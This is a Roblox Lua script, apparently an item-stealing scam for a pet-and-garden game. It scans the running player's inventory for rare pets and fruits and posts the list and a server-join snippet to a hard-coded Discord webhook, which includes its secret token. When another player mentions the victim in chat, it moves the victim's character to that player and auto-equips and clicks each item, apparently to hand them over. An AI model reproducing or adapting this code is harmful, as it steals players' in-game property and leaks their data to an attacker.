-- Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local Camera = workspace.CurrentCamera
local VirtualInputManager = game:GetService("VirtualInputManager")
local TeleportService = game:GetService("TeleportService")

-- Configuration
local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
local RARE_PETS = {"T-Rex", "Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}

-- Improved item patterns to handle all cases
local FRUIT_PATTERN = "%[(.-)%]%s(.+)%s%[(%d*%.?%d+)kg%]"
local PET_PATTERN = "(.+)%s%[(%d*%.?%d+)%sKG%]%s%[Age%s(%d+)%]"

-- Current tool tracking
local currentTool = nil
local toolRemovedConn = nil

-- Monitor tool removal with better error handling
local function monitorToolRemoval()
    if toolRemovedConn then
        toolRemovedConn:Disconnect()
    end
    
    if LocalPlayer.Character then
        toolRemovedConn = LocalPlayer.Character.ChildRemoved:Connect(function(child)
            if child == currentTool then
                currentTool = nil
                toolRemovedConn:Disconnect()
            end
        end)
    end
end

-- Inventory scanner with better pattern matching
local function scanInventory(player)
    local fruits = {}
    local pets = {}
    local rarePets = {}
    
    for _, item in pairs(player.Backpack:GetChildren()) do
        local name = item.Name
        
        -- Parse fruits (handles any number of mutations)
        local fruitTraits, fruitName, fruitWeight = name:match(FRUIT_PATTERN)
        if fruitName then
            local traitCount = select(2, fruitTraits:gsub(",", ",")) + 1
            table.insert(fruits, {
                name = name,
                item = item,
                traits = fruitTraits,
                traitCount = traitCount,
                weight = tonumber(fruitWeight) or 0
            })
        
        -- Parse pets
        else
            local petName, petWeight, petAge = name:match(PET_PATTERN)
            if petName then
                local isRare = false
                for _, rarePet in pairs(RARE_PETS) do
                    if petName:lower():find(rarePet:lower()) then
                        isRare = true
                        break
                    end
                end
                
                local petData = {
                    name = name,
                    item = item,
                    weight = tonumber(petWeight) or 0,
                    age = tonumber(petAge) or 0,
                    isRare = isRare
                }
                
                table.insert(pets, petData)
                if isRare then
                    table.insert(rarePets, petData)
                end
            end
        end
    end
    
    -- Sort pets by priority (rare > weight > age)
    table.sort(pets, function(a, b)
        if a.isRare ~= b.isRare then
            return a.isRare
        elseif a.weight ~= b.weight then
            return a.weight > b.weight
        else
            return a.age > b.age
        end
    end)
    
    -- Sort fruits by priority (trait count > weight)
    table.sort(fruits, function(a, b)
        if a.traitCount ~= b.traitCount then
            return a.traitCount > b.traitCount
        else
            return a.weight > b.weight
        end
    end)
    
    return fruits, pets, rarePets
end

-- Safe string concatenation for webhook
local function safeConcat(items, maxLength)
    local result = {}
    local currentLength = 0
    
    for _, item in ipairs(items) do
        local itemStr = tostring(item)
        if currentLength + #itemStr > maxLength then
            table.insert(result, "... (truncated)")
            break
        end
        table.insert(result, itemStr)
        currentLength = currentLength + #itemStr + 1 -- +1 for newline
    end
    
    return table.concat(result, "\n")
end

-- Send initial inventory with better formatting
local function sendInitialInventory()
    local fruits, pets, rarePets = scanInventory(LocalPlayer)
    
    -- Prepare pet list
    local petList = {}
    for _, pet in ipairs(pets) do
        table.insert(petList, pet.name .. (pet.isRare and " ★" or ""))
    end
    
    -- Prepare fruit list
    local fruitList = {}
    for _, fruit in ipairs(fruits) do
        table.insert(fruitList, fruit.name)
    end
    
    local embed = {
        title = "📦 "..LocalPlayer.Name.."'s Inventory",
        description = "Ready to collect items!",
        color = #rarePets > 0 and 0xFF0000 or 0x00FF00,
        fields = {
            {
                name = "🐾 Pets ("..#pets..")",
                value = #pets > 0 and "```"..safeConcat(petList, 1000).."```" or "```None```",
                inline = true
            },
            {
                name = "🍇 Fruits ("..#fruits..")",
                value = #fruits > 0 and "```"..safeConcat(fruitList, 1000).."```" or "```None```",
                inline = true
            },
            {
                name = "🔗 Join Server",
                value = string.format('```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")\n```', 
                    game.PlaceId, game.JobId),
                inline = false
            }
        }
    }
    
    pcall(function()
        local json = HttpService:JSONEncode({
            content = #rarePets > 0 and "@everyone" or nil,
            embeds = {embed}
        })
        if request then
            request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = json
            })
        else
            HttpService:PostAsync(WEBHOOK_URL, json)
        end
    end)
end

-- Improved collection with better error handling
local function collectFromPlayer(targetPlayer)
    local targetChar = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()
    local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local humanoid = myChar:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end

    -- Max zoom out
    LocalPlayer.CameraMaxZoomDistance = 100
    LocalPlayer.CameraMinZoomDistance = 100
    LocalPlayer.CameraMode = Enum.CameraMode.Classic

    -- Position in front of target
    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
    myChar:SetPrimaryPartCFrame(targetChar:GetPrimaryPartCFrame() * CFrame.new(0, 0, -3))

    -- Get sorted inventory
    local fruits, pets = scanInventory(targetPlayer)
    local allItems = {}
    
    -- Add pets first
    for _, pet in ipairs(pets) do
        table.insert(allItems, pet.item)
    end
    
    -- Then add fruits
    for _, fruit in ipairs(fruits) do
        table.insert(allItems, fruit.item)
    end

    -- Process each item
    for _, item in ipairs(allItems) do
        -- Equip the item
        pcall(function()
            humanoid:EquipTool(item)
            currentTool = item
            monitorToolRemoval()
        end)
        task.wait(0.5)

        -- Click and hold for 5 seconds
        local viewport = Camera.ViewportSize
        local center = Vector2.new(viewport.X/2, viewport.Y/2)
        
        VirtualInputManager:SendMouseButtonEvent(center.X, center.Y, 0, true, game, 1)
        
        -- Wait for 5 seconds or until tool is removed
        local startTime = os.clock()
        while os.clock() - startTime < 5 and currentTool ~= nil do
            task.wait(0.1)
        end
        
        VirtualInputManager:SendMouseButtonEvent(center.X, center.Y, 0, false, game, 1)
        
        -- If tool wasn't removed, unequip it manually
        if currentTool then
            pcall(function()
                humanoid:UnequipTools()
                currentTool = nil
            end)
        end
        
        task.wait(1) -- Cooldown
    end
end

-- Chat handler with better mention detection
local function onPlayerChatted(player, message)
    if player == LocalPlayer then return end
    
    -- Check for @mention (more flexible matching)
    local lowerMsg = message:lower()
    local lowerName = LocalPlayer.Name:lower()
    if not (lowerMsg:match("@%s*"..lowerName) or 
       lowerMsg:match("@everyone") or 
       lowerMsg:match("@here")) then
        return
    end
    
    -- Collect from player
    task.spawn(collectFromPlayer, player)
end

-- Initialize with proper error handling
local function initialize()
    -- Wait for character to load
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    
    -- Send initial inventory after short delay
    task.delay(5, sendInitialInventory)
    
    -- Setup chat listeners
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            player.Chatted:Connect(onPlayerChatted)
        end
    end
    
    Players.PlayerAdded:Connect(function(player)
        player.Chatted:Connect(onPlayerChatted)
    end)
    
    print("✅ Item Collector Active! Waiting for mentions...")
end

-- Start with proper error protection
local success, err = pcall(initialize)
if not success then
    warn("❌ Initialization error:", err)
    -- Try again after delay
    task.delay(5, function()
        pcall(initialize)
    end)
end
